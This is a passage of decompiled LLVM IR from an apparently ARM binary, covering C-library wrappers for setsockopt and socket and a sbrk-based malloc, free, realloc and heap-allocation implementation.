  store i32 %v5_d2cc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_d2cc, -4095
  br i1 %tmp, label %dec_label_pc_d2ec, label %dec_label_pc_d2dc

dec_label_pc_d2dc:                                ; preds = %entry
  %v0_d2dc = call i32 @__errno_location()
  %v0_d2e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_d2e0 = sub i32 0, %v0_d2e0
  %v2_d2e4 = inttoptr i32 %v0_d2dc to i32*
  store i32 %v1_d2e0, i32* %v2_d2e4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d2ec

dec_label_pc_d2ec:                                ; preds = %entry, %dec_label_pc_d2dc
  %v0_d2ec = phi i32 [ %v5_d2cc, %entry ], [ -1, %dec_label_pc_d2dc ]
  %v2_d2f0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_d2f0, i32* @r4, align 4
  ret i32 %v0_d2ec

; uselistorder directives
  uselistorder i32 %v5_d2cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d2ec, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d2f4 = load i32, i32* @r4, align 4
  store i32 %v3_d2f4, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_d2fc = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_d2fc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_d2fc, -4095
  br i1 %tmp, label %dec_label_pc_d31c, label %dec_label_pc_d30c

dec_label_pc_d30c:                                ; preds = %entry
  %v0_d30c = call i32 @__errno_location()
  %v0_d310 = load i32, i32* %r4.global-to-local, align 4
  %v1_d310 = sub i32 0, %v0_d310
  %v2_d314 = inttoptr i32 %v0_d30c to i32*
  store i32 %v1_d310, i32* %v2_d314, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d31c

dec_label_pc_d31c:                                ; preds = %entry, %dec_label_pc_d30c
  %v0_d31c = phi i32 [ %v5_d2fc, %entry ], [ -1, %dec_label_pc_d30c ]
  %v2_d320 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d320, i32* @r4, align 4
  ret i32 %v0_d31c

; uselistorder directives
  uselistorder i32 %v5_d2fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d31c, { 1, 0 }
}

define i32 @socket() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d324 = load i32, i32* @r4, align 4
  store i32 %v3_d324, i32* %stack_var_-8, align 4
  %v0_d328 = call i32 @socket()
  store i32 %v0_d328, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_d328, -4095
  br i1 %tmp, label %dec_label_pc_d348, label %dec_label_pc_d338

dec_label_pc_d338:                                ; preds = %entry
  %v0_d338 = call i32 @__errno_location()
  %v0_d33c = load i32, i32* %r4.global-to-local, align 4
  %v1_d33c = sub i32 0, %v0_d33c
  %v2_d340 = inttoptr i32 %v0_d338 to i32*
  store i32 %v1_d33c, i32* %v2_d340, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d348

dec_label_pc_d348:                                ; preds = %entry, %dec_label_pc_d338
  %v0_d348 = phi i32 [ %v0_d328, %entry ], [ -1, %dec_label_pc_d338 ]
  %v2_d34c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d34c, i32* @r4, align 4
  ret i32 %v0_d348

; uselistorder directives
  uselistorder i32 %v0_d328, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d348, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_d350 = load i32, i32* @r4, align 4
  %v6_d350 = load i32, i32* @r5, align 4
  %v9_d350 = load i32, i32* @r6, align 4
  %v0_d354 = load i32, i32* %r0.global-to-local, align 4
  %v2_d354 = icmp eq i32 %v0_d354, 0
  %v2_d358 = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_d354, label %bb, label %dec_label_pc_d364

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d36c

dec_label_pc_d364:                                ; preds = %entry
  %tmp = icmp ugt i32 %v0_d354, -8
  br i1 %tmp, label %dec_label_pc_d470, label %dec_label_pc_d36c

dec_label_pc_d36c:                                ; preds = %bb, %dec_label_pc_d364
  %v0_d36c = phi i32 [ %v0_d354, %dec_label_pc_d364 ], [ 1, %bb ]
  %v1_d36c = add i32 %v0_d36c, 4
  store i32 %v1_d36c, i32* %stack_var_-20, align 4
  store i32 %v2_d358, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_20df0.538 to i32), i32* %r0.global-to-local, align 4
  %v1_d384 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_1e5b0.542 to i32), i32* %r0.global-to-local, align 4
  %v3_d390 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_1e5b0.542 to i32*), i32 %v2_d358)
  store i32 %v3_d390, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20df0.538 to i32), i32* %r0.global-to-local, align 4
  store i32 54184, i32* @lr, align 4
  %v1_d3a4 = call i32 @__pthread_return_0()
  store i32 %v1_d3a4, i32* %r0.global-to-local, align 4
  %v2_d3a8 = icmp eq i32 %v3_d390, 0
  br i1 %v2_d3a8, label %dec_label_pc_d3b0, label %dec_label_pc_d460

dec_label_pc_d3b0:                                ; preds = %dec_label_pc_d36c
  %v2_d3b4 = load i32, i32* @global_var_20e18.396, align 4
  store i32 %v2_d3b4, i32* @r4, align 4
  %v2_d3b8 = load i32, i32* %stack_var_-20, align 4
  %v3_d3bc = icmp ult i32 %v2_d3b8, %v2_d3b4
  br i1 %v3_d3bc, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_d3b0
  %v3_d3c0 = add i32 %v2_d3b4, -1
  %v2_d3c4 = add i32 %v3_d3c0, %v2_d3b8
  %v2_d3c8 = sub i32 0, %v2_d3b4
  %v3_d3cc = and i32 %v2_d3c4, %v2_d3c8
  store i32 %v3_d3cc, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_d3b0, %bb14
  store i32 ptrtoint (i32* @global_var_20e78.546 to i32), i32* %r0.global-to-local, align 4
  %v1_d3d8 = call i32 @__pthread_return_0()
  %v0_d3dc = load i32, i32* @r4, align 4
  store i32 %v0_d3dc, i32* %r0.global-to-local, align 4
  %v1_d3e0 = call i32 @__GI_sbrk(i32 %v0_d3dc)
  store i32 %v1_d3e0, i32* %r0.global-to-local, align 4
  %v7_d3e4 = icmp eq i32 %v1_d3e0, -1
  br i1 %v7_d3e4, label %bb15, label %dec_label_pc_d3f0

bb15:                                             ; preds = %.thread3
  store i32 %v1_d3e0, i32* @r5, align 4
  br label %dec_label_pc_d404

dec_label_pc_d3f0:                                ; preds = %.thread3
  %v1_d3f0 = add i32 %v1_d3e0, 3
  %v1_d3f4 = and i32 %v1_d3f0, -4
  store i32 %v1_d3f4, i32* @r5, align 4
  %v9_d3f8 = icmp eq i32 %v1_d3f4, %v1_d3e0
  br i1 %v9_d3f8, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_d3f0
  %v3_d3fc = sub i32 %v1_d3f4, %v1_d3e0
  store i32 %v3_d3fc, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_d3f0, %bb16
  %v1_d400 = xor i1 %v9_d3f8, true
  call void @__pseudo_cond_branch(i1 %v1_d400, i32 ptrtoint (i32* @global_var_ebf4.547 to i32))
  br label %dec_label_pc_d404

dec_label_pc_d404:                                ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_20e78.546 to i32), i32* %r0.global-to-local, align 4
  store i32 54292, i32* @lr, align 4
  %v1_d410 = call i32 @__pthread_return_0()
  store i32 %v1_d410, i32* %r0.global-to-local, align 4
  %v0_d414 = load i32, i32* @r5, align 4
  %v7_d414 = icmp eq i32 %v0_d414, -1
  br i1 %v7_d414, label %dec_label_pc_d470, label %dec_label_pc_d41c

dec_label_pc_d41c:                                ; preds = %dec_label_pc_d404
  store i32 ptrtoint (i32* @global_var_20df0.538 to i32), i32* %r0.global-to-local, align 4
  %v1_d428 = call i32 @__pthread_return_0()
  %v0_d42c = load i32, i32* @r4, align 4
  %v0_d430 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_1e5b0.542 to i32), i32* %r0.global-to-local, align 4
  %sext = mul i32 %v0_d430, 16777216
  %v2_d438 = sdiv i32 %sext, 16777216
  %v5_d438 = call i32 @__heap_free(i32* bitcast (i32** @global_var_1e5b0.542 to i32*), i32 %v2_d438, i32 %v0_d42c)
  store i32 ptrtoint (i32** @global_var_1e5b0.542 to i32), i32* %r0.global-to-local, align 4
  %v3_d444 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_1e5b0.542 to i32*), i32 %v2_d358)
  store i32 %v3_d444, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20df0.538 to i32), i32* %r0.global-to-local, align 4
  store i32 54360, i32* @lr, align 4
  %v1_d454 = call i32 @__pthread_return_0()
  store i32 %v1_d454, i32* %r0.global-to-local, align 4
  %v2_d458 = icmp eq i32 %v3_d444, 0
  br i1 %v2_d458, label %dec_label_pc_d470, label %dec_label_pc_d460

dec_label_pc_d460:                                ; preds = %dec_label_pc_d36c, %dec_label_pc_d41c
  %v1_d464 = phi i32 [ %v3_d390, %dec_label_pc_d36c ], [ %v3_d444, %dec_label_pc_d41c ]
  %v2_d460 = load i32, i32* %stack_var_-20, align 4
  %v2_d464 = inttoptr i32 %v1_d464 to i32*
  store i32 %v2_d460, i32* %v2_d464, align 4
  %v3_d464 = load i32, i32* %r4.global-to-local, align 4
  %v4_d464 = add i32 %v3_d464, 4
  store i32 %v4_d464, i32* %r4.global-to-local, align 4
  %v2_d468 = icmp eq i32 %v4_d464, 0
  br i1 %v2_d468, label %dec_label_pc_d470, label %dec_label_pc_d480

dec_label_pc_d470:                                ; preds = %dec_label_pc_d460, %dec_label_pc_d41c, %dec_label_pc_d404, %dec_label_pc_d364
  %v0_d470 = call i32 @__errno_location()
  store i32 %v0_d470, i32* %r0.global-to-local, align 4
  %v2_d478 = inttoptr i32 %v0_d470 to i32*
  store i32 12, i32* %v2_d478, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d480

dec_label_pc_d480:                                ; preds = %dec_label_pc_d460, %dec_label_pc_d470
  %v0_d480 = phi i32 [ %v4_d464, %dec_label_pc_d460 ], [ 0, %dec_label_pc_d470 ]
  store i32 %v0_d480, i32* %r0.global-to-local, align 4
  store i32 %v3_d350, i32* @r4, align 4
  store i32 %v6_d350, i32* @r5, align 4
  store i32 %v9_d350, i32* @r6, align 4
  ret i32 %v0_d480

; uselistorder directives
  uselistorder i32 %v0_d480, { 1, 0 }
  uselistorder i32 %v3_d444, { 1, 0, 2 }
  uselistorder i32 %v1_d3f4, { 1, 0, 2 }
  uselistorder i32 %v1_d3e0, { 2, 0, 3, 4, 1, 5 }
  uselistorder i32 %v3_d390, { 1, 0, 2 }
  uselistorder i32 %v0_d354, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 5, 7, 4, 6, 8, 9, 10, 2, 12, 11, 16, 14, 13, 3, 15, 17, 18, 19, 0, 1 }
  uselistorder label %dec_label_pc_d480, { 1, 0 }
  uselistorder label %dec_label_pc_d460, { 1, 0 }
  uselistorder label %dec_label_pc_d404, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_d36c, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_d4a4 = load i32, i32* @r0, align 4
  %v2_d4a4 = icmp eq i32 %v0_d4a4, 0
  %v3_d4a8 = load i32, i32* @r4, align 4
  store i32 %v3_d4a8, i32* %stack_var_-24, align 4
  %v6_d4a8 = load i32, i32* @r5, align 4
  %v9_d4a8 = load i32, i32* @r6, align 4
  %v15_d4a8 = load i32, i32* @r8, align 4
  br i1 %v2_d4a4, label %bb, label %bb11

bb:                                               ; preds = %entry
  ret i32 0

bb11:                                             ; preds = %entry
  %v1_d4b0 = add i32 %v0_d4a4, -4
  %v2_d4b0 = inttoptr i32 %v1_d4b0 to i32*
  %v3_d4b0 = load i32, i32* %v2_d4b0, align 4
  store i32 %v3_d4b0, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_1e5b0.542 to i32), i32* %r8.global-to-local, align 4
  store i32 %v1_d4b0, i32* @r4, align 4
  %v1_d4c8 = call i32 @__pthread_return_0()
  %v0_d4cc = load i32, i32* @r4, align 4
  %v0_d4d0 = load i32, i32* @r5, align 4
  %v4_d4d8 = call i32 @__heap_free(i32* bitcast (i32** @global_var_1e5b0.542 to i32*), i32 %v0_d4cc, i32 %v0_d4d0)
  %v1_d4e0 = inttoptr i32 %v4_d4d8 to i32*
  %v2_d4e0 = load i32, i32* %v1_d4e0, align 4
  store i32 %v2_d4e0, i32* %r6.global-to-local, align 4
  %v2_d4e4 = load i32, i32* @global_var_20e18.396, align 4
  %v4_d4e8 = mul i32 %v2_d4e4, 8
  %v6_d4e8 = icmp ult i32 %v2_d4e0, %v4_d4e8
  store i32 %v4_d4d8, i32* @r4, align 4
  br i1 %v6_d4e8, label %dec_label_pc_d528, label %dec_label_pc_d4f4

dec_label_pc_d4f4:                                ; preds = %bb11
  %v1_d4fc = call i32 @__pthread_return_0()
  %v1_d504 = call i32 @__GI_sbrk(i32 0)
  %v0_d508 = load i32, i32* @r4, align 4
  %v1_d508 = add i32 %v0_d508, 12
  store i32 %v1_d508, i32* @r5, align 4
  %v9_d50c = icmp eq i32 %v1_d508, %v1_d504
  br i1 %v9_d50c, label %dec_label_pc_d530, label %dec_label_pc_d514

dec_label_pc_d514:                                ; preds = %dec_label_pc_d4f4
  %v1_d520 = call i32 @__pthread_return_0()
  br label %dec_label_pc_d528

dec_label_pc_d528:                                ; preds = %bb11, %dec_label_pc_d514, %bb14
  %v2_d528 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_d528, i32* @r4, align 4
  store i32 %v6_d4a8, i32* @r5, align 4
  store i32 %v9_d4a8, i32* %r6.global-to-local, align 4
  store i32 %v15_d4a8, i32* %r8.global-to-local, align 4
  %v0_d52c = call i32 @__pthread_return_0()
  %v0_d530.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d530

dec_label_pc_d530:                                ; preds = %dec_label_pc_d4f4, %dec_label_pc_d528
  %v1_d538 = phi i32 [ %v0_d508, %dec_label_pc_d4f4 ], [ %v0_d530.pre, %dec_label_pc_d528 ]
  %v1_d530 = add i32 %v1_d538, 4
  %v2_d530 = inttoptr i32 %v1_d530 to i32*
  %v3_d530 = load i32, i32* %v2_d530, align 4
  %v2_d534 = icmp eq i32 %v3_d530, 0
  br i1 %v2_d534, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_d530
  %v2_d538 = add i32 %v1_d538, 8
  %v3_d538 = inttoptr i32 %v2_d538 to i32*
  %v4_d538 = load i32, i32* %v3_d538, align 4
  %v3_d53c = add i32 %v3_d530, 8
  %v4_d53c = inttoptr i32 %v3_d53c to i32*
  store i32 %v4_d538, i32* %v4_d53c, align 4
  %v0_d540.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d530, %bb12
  %v0_d540 = phi i32 [ %v1_d538, %dec_label_pc_d530 ], [ %v0_d540.pre, %bb12 ]
  %v1_d540 = add i32 %v0_d540, 8
  %v2_d540 = inttoptr i32 %v1_d540 to i32*
  %v3_d540 = load i32, i32* %v2_d540, align 4
  %v1_d544 = add i32 %v0_d540, 4
  %v2_d544 = inttoptr i32 %v1_d544 to i32*
  %v3_d544 = load i32, i32* %v2_d544, align 4
  %v2_d548 = icmp eq i32 %v3_d540, 0
  br i1 %v2_d548, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_d54c = add i32 %v3_d540, 4
  %v4_d54c = inttoptr i32 %v3_d54c to i32*
  store i32 %v3_d544, i32* %v4_d54c, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_d550 = load i32, i32* %r8.global-to-local, align 4
  %v3_d550 = inttoptr i32 %v2_d550 to i32*
  store i32 %v3_d544, i32* %v3_d550, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  %v1_d560 = call i32 @__pthread_return_0()
  %v0_d564 = load i32, i32* %r6.global-to-local, align 4
  %v1_d564 = load i32, i32* @r4, align 4
  %v0_d56c = load i32, i32* @r5, align 4
  %v2_d564 = sub i32 12, %v0_d564
  %v1_d568 = add i32 %v2_d564, %v1_d564
  %v2_d56c = sub i32 %v1_d568, %v0_d56c
  %v1_d570 = call i32 @__GI_sbrk(i32 %v2_d56c)
  br label %dec_label_pc_d528

; uselistorder directives
  uselistorder i32 %v0_d540, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_sbrk, { 1, 0, 2 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_d530, { 1, 0 }
  uselistorder label %dec_label_pc_d528, { 2, 1, 0 }
}

define i32 @realloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_d594 = load i32, i32* @r4, align 4
  store i32 %v3_d594, i32* %stack_var_-24, align 4
  %v6_d594 = load i32, i32* @r5, align 4
  %v9_d594 = load i32, i32* @r6, align 4
  %v12_d594 = load i32, i32* @r7, align 4
  %v15_d594 = load i32, i32* @r8, align 4
  %v18_d594 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_d598 = icmp eq i32 %arg2, 0
  %v0_d59c = load i32, i32* @r0, align 4
  store i32 %v0_d59c, i32* @r7, align 4
  br i1 %v2_d598, label %dec_label_pc_d5a4, label %dec_label_pc_d5ac

dec_label_pc_d5a4:                                ; preds = %entry
  %v0_d5a4 = call i32 @free()
  %v0_d5b4.pre = load i32, i32* @r4, align 4
  %v2_d5b8.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_d5b4

dec_label_pc_d5ac:                                ; preds = %entry
  %v2_d5ac = icmp eq i32 %v0_d59c, 0
  br i1 %v2_d5ac, label %dec_label_pc_d5b4, label %dec_label_pc_d5c0

dec_label_pc_d5b4:                                ; preds = %dec_label_pc_d5ac, %dec_label_pc_d5a4
  %v2_d5b8 = phi i32 [ %v3_d594, %dec_label_pc_d5ac ], [ %v2_d5b8.pre, %dec_label_pc_d5a4 ]
  %v0_d5b4 = phi i32 [ %arg2, %dec_label_pc_d5ac ], [ %v0_d5b4.pre, %dec_label_pc_d5a4 ]
  store i32 %v2_d5b8, i32* @r4, align 4
  store i32 %v6_d594, i32* @r5, align 4
  store i32 %v9_d594, i32* @r6, align 4
  store i32 %v12_d594, i32* @r7, align 4
  store i32 %v18_d594, i32* @lr, align 4
  %v1_d5bc = call i32 @malloc(i32 %v0_d5b4)
  %v0_d5c0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d5c0

dec_label_pc_d5c0:                                ; preds = %dec_label_pc_d5ac, %dec_label_pc_d5b4
  %v0_d5d8 = phi i32 [ %v0_d59c, %dec_label_pc_d5ac ], [ %v1_d5bc, %dec_label_pc_d5b4 ]
  %v0_d5c0 = phi i32 [ %arg2, %dec_label_pc_d5ac ], [ %v0_d5c0.pre, %dec_label_pc_d5b4 ]
  %v1_d5c0 = add i32 %v0_d5c0, 7
  %v1_d5c4 = and i32 %v1_d5c0, -4
  store i32 %v1_d5c4, i32* @r5, align 4
  %v2_d5c8 = icmp ugt i32 %v1_d5c4, 10
  %v1_d5cc = add i32 %v0_d5d8, -4
  %v2_d5cc = inttoptr i32 %v1_d5cc to i32*
  %v3_d5cc = load i32, i32* %v2_d5cc, align 4
  store i32 %v3_d5cc, i32* @r6, align 4
  br i1 %v2_d5c8, label %bb14, label %bb

bb:                                               ; preds = %dec_label_pc_d5c0
  store i32 12, i32* @r5, align 4
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_d5c0, %bb
  %v0_d654 = phi i32 [ %v1_d5c4, %dec_label_pc_d5c0 ], [ 12, %bb ]
  store i32 %v1_d5cc, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_d654, %v3_d5cc
  br i1 %tmp, label %dec_label_pc_d5e0, label %dec_label_pc_d654

dec_label_pc_d5e0:                                ; preds = %bb14
  %v2_d5d4 = sub i32 %v0_d654, %v3_d5cc
  %v1_d5f0 = call i32 @__pthread_return_0()
  %v0_d5f8 = load i32, i32* @r8, align 4
  %v1_d5f8 = load i32, i32* @r6, align 4
  %v2_d5f8 = add i32 %v1_d5f8, %v0_d5f8
  %v4_d600 = call i32 @__heap_alloc_at(i32* bitcast (i32** @global_var_1e5b0.542 to i32*), i32 %v2_d5f8, i32 %v2_d5d4)
  store i32 %v4_d600, i32* @r4, align 4
  store i32 54808, i32* @lr, align 4
  %v1_d614 = call i32 @__pthread_return_0()
  %v0_d618 = load i32, i32* @r4, align 4
  %v2_d618 = icmp eq i32 %v0_d618, 0
  br i1 %v2_d618, label %dec_label_pc_d628, label %.thread

.thread:                                          ; preds = %dec_label_pc_d5e0
  %v1_d61c = load i32, i32* @r6, align 4
  %v3_d61c = add i32 %v1_d61c, %v0_d618
  %v2_d620 = load i32, i32* @r7, align 4
  %v3_d620 = add i32 %v2_d620, -4
  %v4_d620 = inttoptr i32 %v3_d620 to i32*
  store i32 %v3_d61c, i32* %v4_d620, align 4
  br label %dec_label_pc_d694

dec_label_pc_d628:                                ; preds = %dec_label_pc_d5e0
  %v0_d628 = load i32, i32* @r5, align 4
  %v1_d628 = add i32 %v0_d628, -4
  %v1_d62c = call i32 @malloc(i32 %v1_d628)
  store i32 %v1_d62c, i32* @r0, align 4
  store i32 %v1_d62c, i32* @r4, align 4
  %v2_d630 = icmp eq i32 %v1_d62c, 0
  br i1 %v2_d630, label %dec_label_pc_d64c, label %dec_label_pc_d638

dec_label_pc_d638:                                ; preds = %dec_label_pc_d628
  %v0_d638 = load i32, i32* @r6, align 4
  %v1_d638 = add i32 %v0_d638, -4
  store i32 %v1_d638, i32* @r2, align 4
  %v0_d63c = load i32, i32* @r7, align 4
  store i32 %v0_d63c, i32* @r1, align 4
  %v0_d640 = call i32 @memcpy()
  %v0_d644 = load i32, i32* @r7, align 4
  store i32 %v0_d644, i32* @r0, align 4
  %v0_d648 = call i32 @free()
  %v0_d64c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d64c

dec_label_pc_d64c:                                ; preds = %dec_label_pc_d628, %dec_label_pc_d638
  %v0_d64c = phi i32 [ 0, %dec_label_pc_d628 ], [ %v0_d64c.pre, %dec_label_pc_d638 ]
  store i32 %v0_d64c, i32* @r7, align 4
  br label %dec_label_pc_d694

dec_label_pc_d654:                                ; preds = %bb14
  %v1_d654 = add i32 %v0_d654, 28
  %tmp15 = icmp ugt i32 %v1_d654, %v3_d5cc
  br i1 %tmp15, label %dec_label_pc_d694, label %dec_label_pc_d660

dec_label_pc_d660:                                ; preds = %dec_label_pc_d654
  %v1_d66c = call i32 @__pthread_return_0()
  %v0_d670 = load i32, i32* @r8, align 4
  %v1_d670 = load i32, i32* @r5, align 4
  %v2_d670 = add i32 %v1_d670, %v0_d670
  %v1_d674 = load i32, i32* @r6, align 4
  %v2_d674 = sub i32 %v1_d674, %v1_d670
  %v4_d67c = call i32 @__heap_free(i32* bitcast (i32** @global_var_1e5b0.542 to i32*), i32 %v2_d670, i32 %v2_d674)
  store i32 54928, i32* @lr, align 4
  %v1_d68c = call i32 @__pthread_return_0()
  %v0_d690 = load i32, i32* @r5, align 4
  %v1_d690 = load i32, i32* @r7, align 4
  %v2_d690 = add i32 %v1_d690, -4
  %v3_d690 = inttoptr i32 %v2_d690 to i32*
  store i32 %v0_d690, i32* %v3_d690, align 4
  br label %dec_label_pc_d694

dec_label_pc_d694:                                ; preds = %.thread, %dec_label_pc_d654, %dec_label_pc_d64c, %dec_label_pc_d660
  %v0_d694 = load i32, i32* @r7, align 4
  store i32 %v9_d594, i32* @r6, align 4
  store i32 %v15_d594, i32* @r8, align 4
  ret i32 %v0_d694

; uselistorder directives
  uselistorder i32 %v1_d670, { 1, 0 }
  uselistorder i32 %v0_d654, { 1, 2, 0 }
  uselistorder i32 %v3_d5cc, { 0, 2, 1, 3 }
  uselistorder i32 (i32*, i32, i32)* @__heap_free, { 0, 2, 1 }
  uselistorder i32** @global_var_1e5b0.542, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_1e5b0.542 to i32*), { 1, 2, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_d694, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_d64c, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %dec_label_pc_d5c0, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_d6ac = inttoptr i32 %arg2 to i32*
  %v2_d6ac = load i32, i32* %v1_d6ac, align 4
  %v3_d6b0 = load i32, i32* @r4, align 4
  store i32 %v3_d6b0, i32* %stack_var_-8, align 4
  %v1_d6b4 = add i32 %v2_d6ac, 3
  %v1_d6b8 = and i32 %v1_d6b4, -4
  store i32 %v1_d6b8, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_d6c0 = icmp ugt i32 %v1_d6b8, 10
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_d6c8 = load i32, i32* %arg1, align 4
  store i32 %v2_d6c8, i32* %r0.global-to-local, align 4
  br i1 %v2_d6c0, label %dec_label_pc_d734.preheader, label %bb

bb:                                               ; preds = %entry
  store i32 12, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d734.preheader

dec_label_pc_d734.preheader:                      ; preds = %entry, %bb
  %v1_d6e8 = phi i32 [ %v1_d6b8, %entry ], [ 12, %bb ]
  %v2_d7349 = icmp eq i32 %v2_d6c8, 0
  br i1 %v2_d7349, label %dec_label_pc_d73c, label %dec_label_pc_d6d4

dec_label_pc_d6d4:                                ; preds = %dec_label_pc_d734.preheader, %dec_label_pc_d730
  %v2_d6ec = phi i32 [ %v3_d730, %dec_label_pc_d730 ], [ %v2_d6c8, %dec_label_pc_d734.preheader ]
  %v1_d6d4 = inttoptr i32 %v2_d6ec to i32*
  %v2_d6d4 = load i32, i32* %v1_d6d4, align 4
  store i32 %v2_d6d4, i32* @ip, align 4
  %v3_d6d8 = icmp ult i32 %v2_d6d4, %v1_d6e8
  br i1 %v3_d6d8, label %dec_label_pc_d730, label %dec_label_pc_d6e0

dec_label_pc_d6e0:                                ; preds = %dec_label_pc_d6d4
  %v1_d6e0 = add i32 %v1_d6e8, 44
  %v3_d6e4 = icmp ult i32 %v2_d6d4, %v1_d6e0
  br i1 %v3_d6e4, label %dec_label_pc_d6f4, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_d6e0
  %v2_d6d8.le = sub i32 %v2_d6d4, %v1_d6e8
  store i32 %v2_d6d8.le, i32* %v1_d6d4, align 4
  %v0_d720.pre = load i32, i32* @ip, align 4
  %v0_d728.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb29

dec_label_pc_d6f4:                                ; preds = %dec_label_pc_d6e0
  %v1_d6f4 = add i32 %v2_d6ec, 4
  %v2_d6f4 = inttoptr i32 %v1_d6f4 to i32*
  %v3_d6f4 = load i32, i32* %v2_d6f4, align 4
  store i32 %v3_d6f4, i32* %r2.global-to-local, align 4
  %v2_d6f8 = icmp eq i32 %v3_d6f4, 0
  br i1 %v2_d6f8, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_d6f4
  %v2_d6fc = add i32 %v2_d6ec, 8
  %v3_d6fc = inttoptr i32 %v2_d6fc to i32*
  %v4_d6fc = load i32, i32* %v3_d6fc, align 4
  %v3_d700 = add i32 %v3_d6f4, 8
  %v4_d700 = inttoptr i32 %v3_d700 to i32*
  store i32 %v4_d6fc, i32* %v4_d700, align 4
  %v0_d704.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_d6f4, %bb27
  %v0_d704 = phi i32 [ %v2_d6ec, %dec_label_pc_d6f4 ], [ %v0_d704.pre, %bb27 ]
  %v1_d704 = add i32 %v0_d704, 8
  %v2_d704 = inttoptr i32 %v1_d704 to i32*
